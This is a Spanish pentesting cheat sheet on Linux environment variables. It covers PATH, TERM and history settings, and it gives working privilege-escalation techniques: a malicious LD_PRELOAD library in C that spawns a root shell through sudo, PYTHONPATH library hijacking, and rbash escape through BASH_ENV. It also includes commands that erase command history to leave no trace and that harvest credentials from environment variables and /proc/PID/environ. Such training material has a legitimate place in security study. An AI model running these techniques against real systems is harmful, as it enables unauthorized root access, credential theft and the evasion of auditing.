# Variables de Entorno en Linux

## Qué son las variables de entorno

Una variable de entorno es un valor con nombre que el sistema operativo pone a disposición de todos los procesos. Piensa en ellas como **variables globales del sistema** — cualquier programa que se ejecute puede leerlas.

Se diferencian de las variables normales de bash en que son **heredadas por los procesos hijos**. Cuando lanzas un programa, ese programa recibe una copia del entorno de su proceso padre.

```shell
# Variable normal de bash (solo existe en la shell actual)
nombre="hola"
echo $nombre   # hola
bash           # nueva shell hija
echo $nombre   # (vacío — no se heredó)

# Variable de entorno (se hereda)
export nombre="hola"
echo $nombre   # hola
bash           # nueva shell hija
echo $nombre   # hola — sí se heredó
```

---

## Comandos básicos

```shell
# Ver todas las variables de entorno
env
printenv

# Ver una variable específica
echo $VARIABLE
printenv VARIABLE

# Definir una variable de entorno
export VARIABLE=valor

# Eliminar una variable de entorno
unset VARIABLE

# Definir una variable solo para un comando concreto
VARIABLE=valor comando
# Ejemplo: LANG=es_ES.UTF-8 man ls
```

---

## Variables de entorno más importantes

### PATH ⭐ (la más relevante en hacking)

Ya explicada en detalle en `Escape-rbash.md`. Define los directorios donde el sistema busca ejecutables.

```shell
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Añadir un directorio al PATH
export PATH=$PATH:/nuevo/directorio

# Reemplazar el PATH completamente
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**En pentesting:** rbash y otras shells restringidas limitan el PATH. Arreglarlo es el primer paso tras escapar una shell restringida.

---

### HOME

Directorio home del usuario actual.

```shell
echo $HOME
# /home/icex64
cd $HOME   # equivalente a cd ~
```

**En pentesting:** Útil para saber dónde buscar archivos de configuración, claves SSH, historiales de comandos.

---

### SHELL

La shell que está usando el usuario.

```shell
echo $SHELL
# /bin/bash
# o /bin/rbash  ← indica que estás en shell restringida
```

**En pentesting:** Si ves `/bin/rbash` o `/usr/bin/rbash`, sabes que tienes shell restringida. Cambiarla:
```shell
export SHELL=/bin/bash
```

---

### USER y LOGNAME

El nombre del usuario actual.

```shell
echo $USER
# tom
```

---

### PWD y OLDPWD

Directorio de trabajo actual y anterior.

```shell
echo $PWD     # /home/tom
cd /tmp
echo $OLDPWD  # /home/tom
cd $OLDPWD    # vuelve a /home/tom
```

---

### TERM

Tipo de terminal. Importante cuando obtienes una reverse shell.

```shell
echo $TERM
# xterm-256color
```

**En pentesting:** Las reverse shells suelen tener `TERM` en blanco, lo que impide usar editores como vim o menos interactivos. Arreglarlo:
```shell
export TERM=xterm-256color
```

---

### HISTFILE y HISTSIZE

Controlan el archivo y tamaño del historial de comandos.

```shell
echo $HISTFILE   # /home/tom/.bash_history
echo $HISTSIZE   # 1000
```

**En pentesting (ofensivo):** Para no dejar rastro de comandos ejecutados:
```shell
# Deshabilitar el historial para la sesión actual
unset HISTFILE
export HISTSIZE=0
export HISTFILESIZE=0
```

**En pentesting (defensivo):** El historial de la víctima puede contener contraseñas, comandos ejecutados, IPs, etc.:
```shell
cat ~/.bash_history
cat /home/usuario/.bash_history
```

---

### LD_PRELOAD y LD_LIBRARY_PATH ⭐ (muy relevante en escalada)

Estas dos variables controlan qué librerías carga el sistema cuando ejecuta un programa.

**LD_PRELOAD:** Carga una librería antes que cualquier otra. Si puedes controlarla, puedes inyectar código en cualquier ejecutable.

**LD_LIBRARY_PATH:** Directorios donde buscar librerías dinámicas.

```shell
echo $LD_PRELOAD
echo $LD_LIBRARY_PATH
```

**En pentesting — escalada de privilegios:**

Si `sudo -l` muestra `env_keep+=LD_PRELOAD`:
```
Defaults env_keep+=LD_PRELOAD
(root) NOPASSWD: /usr/bin/find
```

Puedes crear una librería maliciosa y cargarla como root:
```c
// evil.c
#include <stdio.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    system("/bin/bash");
}
```

```shell
gcc -fPIC -shared -o /tmp/evil.so evil.c -nostartfiles
sudo LD_PRELOAD=/tmp/evil.so find
# shell root ✅
```

---

### PYTHONPATH ⭐

Directorios donde Python busca módulos al hacer `import`.

```shell
echo $PYTHONPATH
```

**En pentesting — Python Library Hijacking:**

Si puedes controlar PYTHONPATH y un script privilegiado importa un módulo, puedes colocar un módulo malicioso:

```shell
# Crear módulo malicioso
echo "import os; os.system('/bin/bash')" > /tmp/webbrowser.py

# Ejecutar el script privilegiado con tu PYTHONPATH
PYTHONPATH=/tmp sudo /usr/bin/python3 script.py
```

Nota: sudo limpia variables de entorno por seguridad. Necesitas `env_keep` en sudoers o usar `-E`:
```shell
sudo -E PYTHONPATH=/tmp python3 script.py
```

---

### BASH_ENV

Script que bash ejecuta automáticamente al arrancar en modo no-interactivo.

**En pentesting — escape de rbash:**
```shell
# Si puedes conectarte con SSH y controlas BASH_ENV
ssh usuario@TARGET -t "BASH_ENV=/dev/null bash --norc"
```

---

## Variables de entorno y sudo

Por defecto, `sudo` limpia todas las variables de entorno antes de ejecutar el comando — esto es una medida de seguridad. Sin embargo, el archivo `/etc/sudoers` puede configurarse para preservar ciertas variables con `env_keep`:

```
# /etc/sudoers
Defaults env_keep+=LD_PRELOAD
Defaults env_keep+=PYTHONPATH
```

Si aparece `env_keep` en sudoers, las variables listadas se preservan y pueden ser vectores de escalada.

Para ver la configuración:
```shell
sudo -l
# Si aparece env_keep → investigar qué variables se preservan
```

---

## Cómo ver las variables de entorno en una máquina objetivo

```shell
# Ver todas las variables del usuario actual
env
printenv

# Buscar información sensible en las variables
env | grep -i "pass\|key\|token\|secret\|api\|aws\|db"

# Ver variables de un proceso específico
cat /proc/PID/environ | tr '\0' '\n'

# Ver variables de todos los procesos (si tienes permisos)
for pid in /proc/[0-9]*; do
    echo "=== PID: $(basename $pid) ==="
    cat "$pid/environ" 2>/dev/null | tr '\0' '\n'
done
```

---

## Variables de entorno con información sensible

En aplicaciones mal configuradas, las credenciales se pasan como variables de entorno:

```shell
# Buscar credenciales en variables de entorno
env | grep -i password
env | grep -i token
env | grep -i key
env | grep -i secret
env | grep -i api

# Ver variables de entorno de servicios systemd
systemctl show nombre-servicio | grep -i env
cat /etc/systemd/system/servicio.service | grep -i env

# Ver variables en archivos de configuración de servicios web
cat /etc/apache2/envvars
cat /etc/nginx/nginx.conf
```

---

## Checklist de variables de entorno en pentesting

```
[ ] echo $PATH → ¿restringido? → export PATH completo
[ ] echo $SHELL → ¿rbash? → escapar
[ ] cat ~/.bash_history → ¿comandos con contraseñas?
[ ] env | grep -i "pass\|key\|token" → ¿credenciales expuestas?
[ ] sudo -l → ¿env_keep? → LD_PRELOAD, PYTHONPATH explotables
[ ] cat /proc/PID/environ → variables de procesos en ejecución
[ ] export TERM=xterm → arreglar terminal en reverse shells
[ ] unset HISTFILE → no dejar rastro (ofensivo)
```

---

## Resumen — las más importantes en hacking

| Variable | Importancia | Uso en hacking |
|----------|------------|----------------|
| `PATH` | ⭐⭐⭐⭐⭐ | rbash escape, PATH hijacking |
| `LD_PRELOAD` | ⭐⭐⭐⭐⭐ | Escalada de privilegios |
| `PYTHONPATH` | ⭐⭐⭐⭐ | Python library hijacking |
| `HISTFILE` | ⭐⭐⭐⭐ | No dejar rastro / encontrar credenciales |
| `SHELL` | ⭐⭐⭐ | Identificar shell restringida |
| `TERM` | ⭐⭐⭐ | Arreglar terminal en reverse shells |
| `BASH_ENV` | ⭐⭐ | Escape de rbash via SSH |
| `HOME` | ⭐⭐ | Localizar archivos de configuración |
